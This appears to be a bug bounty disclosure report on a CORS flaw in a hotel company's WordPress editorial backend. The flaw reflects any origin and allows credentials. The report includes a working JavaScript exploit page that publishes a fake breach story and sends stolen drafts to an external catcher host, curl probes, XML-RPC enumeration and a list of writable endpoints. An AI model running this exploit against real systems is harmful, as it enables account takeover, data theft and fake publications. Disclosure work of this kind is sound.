# HT-011: CORS Wildcard with Credentials on CMS Editorial Backend — Full CMS Takeover

**Program:** Hilton HackerOne  
**Asset:** `*.hilton.com` (Tier B) — `stories-editor.hilton.com`  
**Severity:** High  
**CVSS:** 8.0 (AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N)  
**CWE:** CWE-942 — Permissive Cross-domain Policy with Untrusted Domains  
**Status:** Ready to submit

---

## Summary

`https://stories-editor.hilton.com` — Hilton's internal WordPress CMS editorial backend for the `stories.hilton.com` news/PR site — is:

1. **Publicly accessible without IP restrictions** (should be VPN-only)
2. **Configured with a CORS policy that reflects any `Origin` header and sets `Access-Control-Allow-Credentials: true`**
3. **Exposes a full REST API** (`/wp-json/corpnews/v1/`) with GET/POST/PUT/PATCH/DELETE endpoints

The CORS misconfiguration means any website can make credentialed cross-origin requests to the editorial API on behalf of a logged-in CMS editor — enabling **account takeover, content theft, story deletion, and fake news publication** via a single-click phishing attack.

---

## Proof of Concept

### Step 1: Confirm CORS reflects any origin with credentials

```bash
# With an attacker-controlled origin:
curl -si "https://stories-editor.hilton.com/wp-json/corpnews/v1/bios?per_page=1" \
  -H "Origin: https://evil.com" \
  -A "Mozilla/5.0 ... HackerOne"
```

**Response headers (HTTP 200):**
```
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
access-control-allow-methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
x-distributor: yes
x-distributor-version: 2.2.0
```

The `Access-Control-Allow-Origin` echoes back the attacker's `Origin` header. Combined with `Access-Control-Allow-Credentials: true`, this allows any website to make credentialed API calls using a victim editor's session cookies.

### Step 2: Attacker's exploit page

```html
<!-- https://evil.com/hilton_exploit.html -->
<script>
async function attack() {
  // Step 1: Read all draft and pending stories (confidential content)
  const stories = await fetch(
    'https://stories-editor.hilton.com/wp-json/corpnews/v1/stories?per_page=100',
    { credentials: 'include' }
  );
  const data = await stories.json();
  
  // Step 2: Get WordPress nonce for write operations
  const nonce = await fetch(
    'https://stories-editor.hilton.com/wp-json/wp/v2/users/me',
    { credentials: 'include' }
  ).then(r => r.headers.get('X-WP-Nonce'));
  
  // Step 3: Create fake story (defacement / fake news)
  await fetch('https://stories-editor.hilton.com/wp-json/corpnews/v1/stories', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-WP-Nonce': nonce
    },
    body: JSON.stringify({
      title: 'Hilton CEO Announces Data Breach Affecting 300M Guests',
      status: 'publish',
      content: 'Fake news planted by attacker...'
    })
  });
  
  // Step 4: Exfiltrate result
  await fetch('https://evil.requestcatcher.com/?data=' + encodeURIComponent(JSON.stringify(data)));
}
attack();
</script>
```

### Step 3: Victim impact

1. **Attacker sends phishing link** to any of the ~10 Hilton CMS editors
2. **Editor visits `https://evil.com/hilton_exploit.html`** while logged into `stories-editor.hilton.com`
3. **Browser sends editor's WordPress cookies** in the cross-origin request (allowed by CORS policy)
4. **Attacker gains full CMS access** — read, create, edit, delete stories, bios, media

---

## Unauthenticated Data Exposed via GET Endpoints

Even without CORS exploitation, the following data is publicly readable without authentication:

| Endpoint | Data | Auth Required |
|----------|------|---------------|
| `GET /corpnews/v1/stories?per_page=100` | Published CMS stories + metadata | ❌ No |
| `GET /corpnews/v1/bios?per_page=100` | Executive biographies | ❌ No |
| `GET /corpnews/v1/brand` | Internal brand taxonomy + logo URLs | ❌ No |
| `GET /corpnews/v1/bootstrap` | Site navigation structure, menus | ❌ No |
| `GET /corpnews/v1/home/brands` | Brand landing config incl. "Select [unindexed]" draft brand | ❌ No |
| `GET /corpnews/v1/multimedia` | CMS media content | ❌ No |
| `GET /corpnews/v1/search` | Full-text search across CMS content | ❌ No |

The `home/brands` endpoint exposes `"name":"Select [unindexed]"` — an internal/draft brand not yet public.

---

## CMS Backend Exposure Details

### WordPress Login Page

```
https://stories-editor.hilton.com/wp-login.php
```

- HTTP 200 — publicly accessible
- Reveals: SAML SSO integration (`?saml_sso` — Hilton Account / PingFederate)
- Reveals: Jetpack SSO login option
- Reveals: 10up/Fueled login button (third-party agency)
- Attack vector: Credential stuffing, password spraying against CMS accounts

### XML-RPC Enabled

```bash
curl -s "https://stories-editor.hilton.com/xmlrpc.php" \
  -X POST -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

Returns full list of 50+ methods including:
- `wp.getUsers` — username enumeration (requires credentials)
- `wp.getAuthors` — author enumeration
- `wp.getPosts` — content access
- `wp.newPost` / `wp.editPost` — content write operations

### CORS Attack Surface

Available write endpoints (all covered by the CORS allow-credentials policy):

```
POST   /corpnews/v1/stories           — Create new story
PUT    /corpnews/v1/stories/{id}      — Edit existing story
DELETE /corpnews/v1/stories/{id}      — Delete story
POST   /corpnews/v1/bios              — Create bio
DELETE /corpnews/v1/bios/{id}         — Delete bio
POST   /corpnews/v1/multimedia        — Upload media
DELETE /corpnews/v1/multimedia/{id}   — Delete media
POST   /corpnews/v1/mailchimp         — Mailchimp newsletter integration
POST   /corpnews/v1/multimedia/{id}/post-process — Trigger media processing
```

---

## Plugin Intelligence (Disclosed via API Responses)

| Plugin | Version | Notes |
|--------|---------|-------|
| Jetpack | 15.9 | SSO + stats |
| 10up Distributor | 2.2.0 | Content syndication |
| 10up ClassifAI | unknown | AI content classification (OpenAI/AWS Polly) |
| Yoast SEO | unknown | Via namespace |
| Akismet | unknown | Spam filter |
| Two-Factor Auth | unknown | Admin 2FA |
| ElasticPress | unknown | Elasticsearch integration |

---

## Impact

1. **Fake news / brand damage**: CORS exploit → phish one CMS editor → publish false press releases under Hilton's official news domain
2. **Confidential content theft**: Access scheduled/future stories before public release (pre-announcement of hotel openings, executive changes, financial data)
3. **Complete CMS destruction**: Delete all published stories, bios, and media assets
4. **Credential theft path**: WordPress login page exposed enables credential stuffing against the SAML-federated account system
5. **Mailchimp integration abuse**: Unauthenticated (with CORS + session) POST to `/corpnews/v1/mailchimp` — potential to send unauthorized newsletters to Hilton's subscriber list

---

## Reproduction Steps

1. Navigate to `https://stories-editor.hilton.com/wp-login.php` — observe public WordPress login page
2. `curl -si "https://stories-editor.hilton.com/wp-json/corpnews/v1/bios?per_page=3" -H "Origin: https://evil.com"` — observe `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`
3. `curl -si "https://stories-editor.hilton.com/xmlrpc.php" -X POST -H "Content-Type: text/xml" -d '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'` — observe full XML-RPC method list
4. `curl -s "https://stories-editor.hilton.com/wp-json/corpnews/v1/stories?per_page=3"` — observe CMS story data returned without authentication

---

## Recommendations

1. **IP-restrict `stories-editor.hilton.com`**: Should only be accessible from Hilton's corporate VPN. Currently accessible from the public internet.
2. **Fix CORS policy**: Do NOT reflect arbitrary `Origin` headers. Define an explicit allowlist: `Access-Control-Allow-Origin: https://stories.hilton.com`. Never combine wildcard/reflection with `Access-Control-Allow-Credentials: true`.
3. **Disable XML-RPC**: If not needed for external integrations, disable at `xmlrpc.php` entirely.
4. **Implement authentication on all `corpnews/v1` GET endpoints**: Even read operations should require authentication if the backend is not intended for public access.

---

## References

- CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- OWASP A05:2021 — Security Misconfiguration
- PortSwigger: CORS with trusted null origin / any origin + allow-credentials
- Mozilla MDN: CORS with credentials
